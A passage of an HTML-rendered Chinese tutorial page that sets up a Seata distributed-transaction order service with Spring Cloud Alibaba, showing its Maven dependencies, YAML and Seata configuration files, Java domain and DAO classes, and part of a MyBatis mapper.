class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mysql-druid--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置文件</p><p>YML</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">2001</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">seata-order-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">alibaba:</span></span><br><span class="line">      <span class="attr">seata:</span></span><br><span class="line">        <span class="comment">#自定义事务组名称需要与seata-server中的对应</span></span><br><span class="line">        <span class="attr">tx-service-group:</span> <span class="string">fsp_tx_group</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/seata_order</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">io:</span></span><br><span class="line">      <span class="attr">seata:</span> <span class="string">info</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">mapperLocations:</span> <span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure><p>file.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">transport &#123;</span><br><span class="line">  # tcp udt unix-domain-socket</span><br><span class="line">  type &#x3D; &quot;TCP&quot;</span><br><span class="line">  #NIO NATIVE</span><br><span class="line">  server &#x3D; &quot;NIO&quot;</span><br><span class="line">  #enable heartbeat</span><br><span class="line">  heartbeat &#x3D; true</span><br><span class="line">  #thread factory for netty</span><br><span class="line">  thread-factory &#123;</span><br><span class="line">    boss-thread-prefix &#x3D; &quot;NettyBoss&quot;</span><br><span class="line">    worker-thread-prefix &#x3D; &quot;NettyServerNIOWorker&quot;</span><br><span class="line">    server-executor-thread-prefix &#x3D; &quot;NettyServerBizHandler&quot;</span><br><span class="line">    share-boss-worker &#x3D; false</span><br><span class="line">    client-selector-thread-prefix &#x3D; &quot;NettyClientSelector&quot;</span><br><span class="line">    client-selector-thread-size &#x3D; 1</span><br><span class="line">    client-worker-thread-prefix &#x3D; &quot;NettyClientWorkerThread&quot;</span><br><span class="line">    # netty boss thread size,will not be used for UDT</span><br><span class="line">    boss-thread-size &#x3D; 1</span><br><span class="line">    #auto default pin or 8</span><br><span class="line">    worker-thread-size &#x3D; 8</span><br><span class="line">  &#125;</span><br><span class="line">  shutdown &#123;</span><br><span class="line">    # when destroy server, wait seconds</span><br><span class="line">    wait &#x3D; 3</span><br><span class="line">  &#125;</span><br><span class="line">  serialization &#x3D; &quot;seata&quot;</span><br><span class="line">  compressor &#x3D; &quot;none&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">service &#123;</span><br><span class="line"></span><br><span class="line">  vgroup_mapping.fsp_tx_group &#x3D; &quot;default&quot; #修改自定义事务组名称</span><br><span class="line"></span><br><span class="line">  default.grouplist &#x3D; &quot;127.0.0.1:8091&quot;</span><br><span class="line">  enableDegrade &#x3D; false</span><br><span class="line">  disable &#x3D; false</span><br><span class="line">  max.commit.retry.timeout &#x3D; &quot;-1&quot;</span><br><span class="line">  max.rollback.retry.timeout &#x3D; &quot;-1&quot;</span><br><span class="line">  disableGlobalTransaction &#x3D; false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">client &#123;</span><br><span class="line">  async.commit.buffer.limit &#x3D; 10000</span><br><span class="line">  lock &#123;</span><br><span class="line">    retry.internal &#x3D; 10</span><br><span class="line">    retry.times &#x3D; 30</span><br><span class="line">  &#125;</span><br><span class="line">  report.retry.count &#x3D; 5</span><br><span class="line">  tm.commit.retry.count &#x3D; 1</span><br><span class="line">  tm.rollback.retry.count &#x3D; 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## transaction log store</span><br><span class="line">store &#123;</span><br><span class="line">  ## store mode: file、db</span><br><span class="line">  mode &#x3D; &quot;db&quot;</span><br><span class="line"></span><br><span class="line">  ## file store</span><br><span class="line">  file &#123;</span><br><span class="line">    dir &#x3D; &quot;sessionStore&quot;</span><br><span class="line"></span><br><span class="line">    # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span><br><span class="line">    max-branch-session-size &#x3D; 16384</span><br><span class="line">    # globe session size , if exceeded throws exceptions</span><br><span class="line">    max-global-session-size &#x3D; 512</span><br><span class="line">    # file buffer size , if exceeded allocate new buffer</span><br><span class="line">    file-write-buffer-cache-size &#x3D; 16384</span><br><span class="line">    # when recover batch read size</span><br><span class="line">    session.reload.read_size &#x3D; 100</span><br><span class="line">    # async, sync</span><br><span class="line">    flush-disk-mode &#x3D; async</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ## database store</span><br><span class="line">  db &#123;</span><br><span class="line">    ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)&#x2F;BasicDataSource(dbcp) etc.</span><br><span class="line">    datasource &#x3D; &quot;dbcp&quot;</span><br><span class="line">    ## mysql&#x2F;oracle&#x2F;h2&#x2F;oceanbase etc.</span><br><span class="line">    db-type &#x3D; &quot;mysql&quot;</span><br><span class="line">    driver-class-name &#x3D; &quot;com.mysql.jdbc.Driver&quot;</span><br><span class="line">    url &#x3D; &quot;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;seata&quot;</span><br><span class="line">    user &#x3D; &quot;root&quot;</span><br><span class="line">    password &#x3D; &quot;123456&quot;</span><br><span class="line">    min-conn &#x3D; 1</span><br><span class="line">    max-conn &#x3D; 3</span><br><span class="line">    global.table &#x3D; &quot;global_table&quot;</span><br><span class="line">    branch.table &#x3D; &quot;branch_table&quot;</span><br><span class="line">    lock-table &#x3D; &quot;lock_table&quot;</span><br><span class="line">    query-limit &#x3D; 100</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">lock &#123;</span><br><span class="line">  ## the lock store mode: local、remote</span><br><span class="line">  mode &#x3D; &quot;remote&quot;</span><br><span class="line"></span><br><span class="line">  local &#123;</span><br><span class="line">    ## store locks in user&#39;s database</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  remote &#123;</span><br><span class="line">    ## store locks in the seata&#39;s server</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">recovery &#123;</span><br><span class="line">  #schedule committing retry period in milliseconds</span><br><span class="line">  committing-retry-period &#x3D; 1000</span><br><span class="line">  #schedule asyn committing retry period in milliseconds</span><br><span class="line">  asyn-committing-retry-period &#x3D; 1000</span><br><span class="line">  #schedule rollbacking retry period in milliseconds</span><br><span class="line">  rollbacking-retry-period &#x3D; 1000</span><br><span class="line">  #schedule timeout retry period in milliseconds</span><br><span class="line">  timeout-retry-period &#x3D; 1000</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">transaction &#123;</span><br><span class="line">  undo.data.validation &#x3D; true</span><br><span class="line">  undo.log.serialization &#x3D; &quot;jackson&quot;</span><br><span class="line">  undo.log.save.days &#x3D; 7</span><br><span class="line">  #schedule delete expired undo_log in milliseconds</span><br><span class="line">  undo.log.delete.period &#x3D; 86400000</span><br><span class="line">  undo.log.table &#x3D; &quot;undo_log&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">## metrics settings</span><br><span class="line">metrics &#123;</span><br><span class="line">  enabled &#x3D; false</span><br><span class="line">  registry-type &#x3D; &quot;compact&quot;</span><br><span class="line">  # multi exporters use comma divided</span><br><span class="line">  exporter-list &#x3D; &quot;prometheus&quot;</span><br><span class="line">  exporter-prometheus-port &#x3D; 9898</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">support &#123;</span><br><span class="line">  ## spring</span><br><span class="line">  spring &#123;</span><br><span class="line">    # auto proxy the DataSource bean</span><br><span class="line">    datasource.autoproxy &#x3D; false</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>registry.conf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">registry &#123;</span><br><span class="line">  # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa</span><br><span class="line">  type &#x3D; &quot;nacos&quot;</span><br><span class="line"></span><br><span class="line">  nacos &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;localhost:8848&quot;</span><br><span class="line">    namespace &#x3D; &quot;&quot;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  eureka &#123;</span><br><span class="line">    serviceUrl &#x3D; &quot;http:&#x2F;&#x2F;localhost:8761&#x2F;eureka&quot;</span><br><span class="line">    application &#x3D; &quot;default&quot;</span><br><span class="line">    weight &#x3D; &quot;1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  redis &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;localhost:6379&quot;</span><br><span class="line">    db &#x3D; &quot;0&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  zk &#123;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">    serverAddr &#x3D; &quot;127.0.0.1:2181&quot;</span><br><span class="line">    session.timeout &#x3D; 6000</span><br><span class="line">    connect.timeout &#x3D; 2000</span><br><span class="line">  &#125;</span><br><span class="line">  consul &#123;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">    serverAddr &#x3D; &quot;127.0.0.1:8500&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  etcd3 &#123;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">    serverAddr &#x3D; &quot;http:&#x2F;&#x2F;localhost:2379&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  sofa &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;127.0.0.1:9603&quot;</span><br><span class="line">    application &#x3D; &quot;default&quot;</span><br><span class="line">    region &#x3D; &quot;DEFAULT_ZONE&quot;</span><br><span class="line">    datacenter &#x3D; &quot;DefaultDataCenter&quot;</span><br><span class="line">    cluster &#x3D; &quot;default&quot;</span><br><span class="line">    group &#x3D; &quot;SEATA_GROUP&quot;</span><br><span class="line">    addressWaitTime &#x3D; &quot;3000&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  file &#123;</span><br><span class="line">    name &#x3D; &quot;file.conf&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">config &#123;</span><br><span class="line">  # file、nacos 、apollo、zk、consul、etcd3</span><br><span class="line">  type &#x3D; &quot;file&quot;</span><br><span class="line"></span><br><span class="line">  nacos &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;localhost&quot;</span><br><span class="line">    namespace &#x3D; &quot;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  consul &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;127.0.0.1:8500&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  apollo &#123;</span><br><span class="line">    app.id &#x3D; &quot;seata-server&quot;</span><br><span class="line">    apollo.meta &#x3D; &quot;http:&#x2F;&#x2F;192.168.1.204:8801&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  zk &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;127.0.0.1:2181&quot;</span><br><span class="line">    session.timeout &#x3D; 6000</span><br><span class="line">    connect.timeout &#x3D; 2000</span><br><span class="line">  &#125;</span><br><span class="line">  etcd3 &#123;</span><br><span class="line">    serverAddr &#x3D; &quot;http:&#x2F;&#x2F;localhost:2379&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  file &#123;</span><br><span class="line">    name &#x3D; &quot;file.conf&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>domain</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonResult</span>&lt;<span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer code;</span><br><span class="line">    <span class="keyword">private</span> String  message;</span><br><span class="line">    <span class="keyword">private</span> T       data;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommonResult</span><span class="params">(Integer code, String message)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(code,message,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.springcloud.alibaba.domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Order</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long userId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long productId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> BigDecimal money;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer status; <span class="comment">//订单状态：0：创建中；1：已完结</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dao接口及实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.springcloud.alibaba.domain.Order;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Param;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrderDao</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//1 新建订单</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(Order order)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2 修改订单状态，从零改为1</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(@Param(<span class="string">"userId"</span>)</span> Long userId,@<span class="title">Param</span><span class="params">(<span class="string">"status"</span>)</span> Integer status)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//mybatis.org//DTD Mapper 3.0//EN"</span> <span class="meta-string">"http://mybatis.org/dtd/mybatis-3-mapper.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">"com.atguigu.springcloud.alibaba.dao.OrderDao"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">"BaseResultMap"</span> <span class="attr">type</span>=<span class="string">"com.atguigu.springcloud.alibaba.domain.Order"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">"id"</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"user_id"</span> <span class="attr">property</span>=<span class="string">"userId"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"product_id"</span> <span class="attr">property</span>=<span class="string">"productId"</span> <span class="attr">jdbcType</span>=<span class="string">"BIGINT"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"count"</span> <span class="attr">property</span>=<span class="string">"count"</span> <span class="attr">jdbcType</span>=<span class="string">"INTEGER"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"money"</span> <span class="attr">property</span>=<span class="string">"money"</span> <span class="attr">jdbcType</span>=<span class="string">"DECIMAL"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">"status"</span> <span class="attr">property</span>=<span class="string">"status"</span> <span 